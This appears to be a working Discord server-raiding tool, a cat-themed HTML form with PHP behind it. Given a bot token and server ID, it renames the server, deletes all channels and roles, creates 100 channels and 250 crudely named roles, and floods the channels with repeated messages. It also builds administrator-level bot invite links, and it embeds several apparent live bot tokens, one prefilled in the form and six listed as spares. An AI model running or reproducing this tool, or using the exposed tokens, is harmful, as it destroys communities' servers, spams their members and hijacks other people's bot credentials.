<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta http-equiv="content-type" charset="UTF-8">
    
    <title>おにゃんこ</title>
   <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
  
  <div class="bg-white py-6 sm:py-8 lg:py-12">
  <div class="mx-auto max-w-screen-2xl px-4 md:px-8">
    <a href="" class="inline-flex items-center gap-2.5 text-2xl font-bold text-black md:text-3xl" aria-label="logo">
            <img  class="h-10 w-10 text-indigo-500" fill="currentColor" src="http://nya.cloudfree.jp/cccp/2.jpeg" style="border-radius:50%;"></img>
    CCCP
    </a>
    <div class="text-center"><p class="text-4xl ...　">おにゃんこ！！！&#128574;</p></div>
    <form id="botForm" method="post">
      
      <div class="sm:col-span-2">
        <label for="token" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">BOTトゥークン</label>
        <input type="text"value="MTI0NTcyNzA5MzA5NDg3OTIzMg.GPF1B7.U2PqUTr6d5to9twsgg1CbBShtzSWuaGo1GgJUg" id="token"name="token"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>

      <div class="sm:col-span-2">
        <label for="serverId" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">Server ID</label>
        <input type="text"id="serverId"name="serverId"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>

      <div class="sm:col-span-2">
        <label for="serverName" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">Server NAME</label>
        <input type="text"id="serverName"name="serverName"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>

      <div class="sm:col-span-2">
        <label for="message" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">Message</label>
        <textarea name="message" class="h-64 w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring"></textarea>
      </div>
    <div class="sm:col-span-2">
        <label for="iconn" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">ICON</label>
        <input type="text"value="wa.png"id="iconn"name="iconn"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>
<br>

 <div class="sm:col-span-2">
        <label for="iconn" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">ちゃんねるめい</label>
        <input type="text"value="おにゃんこ攻撃"id="chna"name="chna"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>
<br>
      <div class="flex items-center justify-between sm:col-span-2">
        <button type="submit"class="inline-block rounded-lg bg-red-500 px-8 py-3 text-center text-sm font-semibold text-white outline-none ring-red-300 transition duration-100 hover:bg-red-600 focus-visible:ring active:bg-red-700 md:text-base">FIREEEEEEEEEEEEEEEEEEEEEEEEEEEEE</button>
      </div>
    </form>
    <br>
	
	
	   <div class="sm:col-span-2"> 
        <label for="serverName" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">bot 招待ユーアールエル作成（オプション）</label>
        <input type="text" id="bot-id"placeholder="ボットのユゥザーアイディー"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>
<br>
	  <div class="flex items-center justify-between sm:col-span-2">
        <button id="generate-button"class="inline-block rounded-lg bg-red-500 px-8 py-3 text-center text-sm font-semibold text-white outline-none ring-red-300 transition duration-100 hover:bg-red-600 focus-visible:ring active:bg-red-700 md:text-base">押さないでください</button>
      </div>

<div class="sm:col-span-2">
        <label for="serverinfo" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">トゥーくんからidせいせい（オプション）</label>
        <input type="text" id="bottoken"placeholder="botのトゥーくんをいれなさい&#128576;"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
      </div>
<br>
	  <div class="flex items-center justify-between sm:col-span-2">
        <button id="getBotId" class="inline-block rounded-lg bg-red-500 px-8 py-3 text-center text-sm font-semibold text-white outline-none ring-red-300 transition duration-100 hover:bg-red-600 focus-visible:ring active:bg-red-700 md:text-base">押さないでください</button>
      </div>
<br>
<p id="botInfo"></p>
<br>
    <div class="flex divide-x rounded-lg border bg-gray-50">
      <div class="flex items-center p-2 text-indigo-500 md:p-4">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 md:h-8 md:w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
        </svg>
      </div>
      <div class="p-4 md:p-6">
        <h3 class="mb-2 text-lg font-semibold md:text-xl">SIMPLE AND NYANKO&#128574;</h3>
        <p class="text-gray-500">安全で低速、簡単なツールができたニャ</p>
			<p>よびとーくん</p>
<div style="word-break: break-all;">
		<p>MTI1MjIxMDQ0MzA5MTU3OTAwMw.G8iyfZ.Xl9Z0Qrsp44_IER5gvRPw5YOhjS9Fl9eYlDX4c</p>
<hr>
		<p>MTI1MTc3MDMzMTcwMjYyNDMyOA.Gn8Q-c.KaPu0otiLkW23BWwj_FCo5lBrKIeaG49ABo_2w</p>
		<hr><p>MTI1MjIxMDQ0MzA5MTU3OTAwMw.GUhvPt.RIB1TnvDSMaGkUy6Oh9PVKv4lsDPnL6Pyh7aAQ</p>
<hr>
		<p>MTI3Mzg1MDk4NDExOTkyNjkwNw.GqZuAI.tM6SNX4X3DuOtYkN4aGLQCL996265ExkYM9OnM</p>
<hr>
<p> MTIxNjkxNjM5Mjc0NjY4NDQ2Nw.GbIx09.fS0WuuNKCSyMry6agEUtRgp5g-czQmj9qeSIAg</p>
<hr>
<p> MTEzMjczMTAxNTkyMDYyNzg1NA.GlBP0C.9xVGk9xlaaIImZI-IylFpz_ziQnMwgII1fJcy0</p>
      </div></div>
    </div>
</body>
</html>
<script>
  document.getElementById("generate-button").addEventListener("click", function() {
    const botId = document.getElementById("bot-id").value;
    const link = `https://discord.com/api/oauth2/authorize?client_id=${botId}&permissions=8&scope=bot`;
    window.open(link, '_blank');
  });
</script>

<script>
        document.getElementById('getBotId').addEventListener('click', async () => {
            const botToken = document.getElementById("bottoken").value;
           

            try {
                const response = await fetch('https://discord.com/api/v10/users/@me', {
                    headers: {
                        'Authorization': `Bot ${botToken}`
                    }
                });

                if (!response.ok) {
                    throw new Error('Failed to fetch bot info');
                }
                const botData = await response.json();
                document.getElementById('botInfo').textContent = `Bot Name: ${botData.username}, Bot ID: ${botData.id}`;
            } catch (error) {
                document.getElementById('botInfo').textContent = `Error: ${error.message}`;
            }
        });
    </script>

<?php
require 'vendor/autoload.php';
use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;
use GuzzleHttp\Promise\Utils;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = $_POST['token'];
    $serverId = $_POST['serverId'];
    $chna = $_POST['chna'];
    $serverName = $_POST['serverName'];
    $message = $_POST['message'];
    $iconn = $_POST['iconn'];
    
    $client = new Client([
        'base_uri' => 'https://discord.com/api/',
        'headers' => [
            'Authorization' => 'Bot ' . $token,
            'Content-Type' => 'application/json'
        ],
        'connect_timeout' => 0,
        'timeout' => 0,
        'http_errors' => false
    ]);

    try {
        $iconData = base64_encode(file_get_contents($iconn));
        $iconDataUri = 'data:image/png;base64,' . $iconData;

        $client->patch("guilds/{$serverId}", [
            'json' => [
                'name' => $serverName,
                'icon' => $iconDataUri
            ]
        ]);

   
        $response = $client->get("guilds/{$serverId}/channels");
        $channels = json_decode($response->getBody(), true);

        if (!is_array($channels)) {
            echo 'チャンネル一覧の取得に失敗しました。レスポンス: ' . $response->getBody();
            exit;
        }

        $deleteChannelPromises = [];
        foreach ($channels as $channel) {
            if (isset($channel['id'])) {
                $deleteChannelPromises[] = $client->deleteAsync("channels/{$channel['id']}")
                ->then(null, function ($reason) use ($channel) {
                    echo 'チャンネル削除に失敗しました。チャンネル名: ' . $channel['name'] . ', エラー: ' . $reason->getMessage();
                });
            }
        }
        Utils::settle($deleteChannelPromises)->wait();
        $newChannelPromises = [];
        $newChannels = [];
        for ($i = 0; $i < 100; $i++) {
            $newChannelPromises[] = $client->postAsync("guilds/{$serverId}/channels", [
                'json' => [
                    'name' => $chna . ($i + 1),
                    'type' => 0
                ]
            ])->then(function ($response) use (&$newChannels) {
                $newChannel = json_decode($response->getBody(), true);
                if (isset($newChannel['id'])) {
                    $newChannels[] = $newChannel['id'];
                }
            });
        }
        Utils::settle($newChannelPromises)->wait();

        $messagePromises = [];
        $batchSize = 70; 
        $delay = 300000; 

        for ($j = 0; $j < 30; $j++) {
            foreach ($newChannels as $channelId) {
                $messagePromises[] = $client->postAsync("channels/{$channelId}/messages", [
                    'json' => [
                        'content' => $message 
                    ]
                ]);
                if (count($messagePromises) >= $batchSize) {
                    Utils::settle($messagePromises)->wait();
                    $messagePromises = []; 
                    usleep($delay); 
                }
            }
        }

        if (!empty($messagePromises)) {
            Utils::settle($messagePromises)->wait();
        }

        $rolesResponse = $client->get("guilds/{$serverId}/roles");
        $roles = json_decode($rolesResponse->getBody(), true);

        if (!is_array($roles)) {
            echo 'ロール一覧の取得に失敗しました。レスポンス: ' . $rolesResponse->getBody();
            exit;
        }

        $deleteRolePromises = [];
        foreach ($roles as $role) {
            if (isset($role['id']) && $role['name'] !== '@everyone') {
                $deleteRolePromises[] = $client->deleteAsync("guilds/{$serverId}/roles/{$role['id']}")
                ->then(null, function ($reason) use ($role) {
                    echo 'ロール削除に失敗しました。ロール名: ' . $role['name'] . ', エラー: ' . $reason->getMessage();
                });
            }
        }
        Utils::settle($deleteRolePromises)->wait();

        $newRolePromises = [];
        for ($i = 0; $i < 250; $i++) {
            $newRolePromises[] = $client->postAsync("guilds/{$serverId}/roles", [
                'json' => [
                    'name' => 'pussy bro ' . ($i + 1),
                    'color' => rand(0, 16777215)
                ]
            ]);
        }
        Utils::settle($newRolePromises)->wait();

        echo "<h1>チャンネルとロールの操作が完了しました</h1>";

    } catch (RequestException $e) {
        echo 'エラー: ' . $e->getMessage();
    }
}

?>
